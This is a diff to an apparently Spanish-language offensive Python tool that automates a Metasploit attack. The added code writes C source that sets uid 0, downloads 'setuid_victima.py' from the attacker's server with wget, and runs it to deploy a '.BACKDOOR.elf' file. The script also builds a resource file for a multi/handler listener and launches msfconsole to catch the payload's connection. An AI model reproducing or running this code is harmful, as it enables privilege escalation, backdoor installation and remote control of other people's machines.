@@ -43,10 +43,30 @@ def escribir_rc(ordenes_rc):
 
     informar(f"{archivo_rc} GENERADO CON EXITO")
 
+def escribir_archivo(servidor):
+    codigo = """#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(){
+  setuid(0);
+  system("wget http://""" + servidor + """/setuid_victima.py");
+  system("python3 setuid_victima.py -r """ + servidor + """ -e .BACKDOOR.elf");
+  return 0;
+}
+"""
+    f = open(c , "w")
+    f.write(codigo)
+    f.close()
+
 def lanza_metasploit():
     os.system(f"msfconsole -q -r {archivo_rc}")
 
-def configurar_archivo():
+def configurar_archivo(ip):
+    informar("Generando Archivo C ")
+    escribir_archivo(ip)
+    os.system(f"cat {c}")
     conf = pedir_dato(f"Desea modificar el archivo {c} antes de compilarlo ? [S/n] ")
     if len(conf) == 0 or conf[0].upper() == "S":
         os.system(f"nano {c}")
@@ -58,7 +78,7 @@ def main():
     ip = obtener_ip_automaticamente(interfaz)
     puerto = pedir_dato("INTRODUCE EL PUERTO A LA ESCUCHA DEL PAYLOAD")
     informar(f"IP DETECTADA :  {ip}")
-    configurar_archivo()
+    configurar_archivo(ip)
     ordenes_rc = [
     "use exploit/multi/handler",
     f"set PAYLOAD {tipo_payload}",
